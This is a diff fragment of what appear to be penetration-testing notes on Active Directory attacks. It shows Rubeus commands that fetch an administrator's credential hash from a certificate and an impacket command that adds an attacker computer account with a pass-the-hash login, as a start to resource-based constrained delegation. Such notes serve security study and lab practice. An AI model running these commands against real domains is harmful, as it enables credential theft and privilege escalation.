@@ -246,7 +246,8 @@ kali: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic 
 .\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
 The result include administrator's hash
 ```
-#### Resource Based Constrained Delegation Attack 
+#### Resource Based Constrained Delegation Attack
+Bloodhound showing GenericAll privileges on the Domain Controller  
 ![image](https://github.com/user-attachments/assets/8a75dfbe-58a3-44a6-a962-dd34daf4b465)
 ```
 impacket-addcomputer resourced.local/l.livingstone(:password) -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
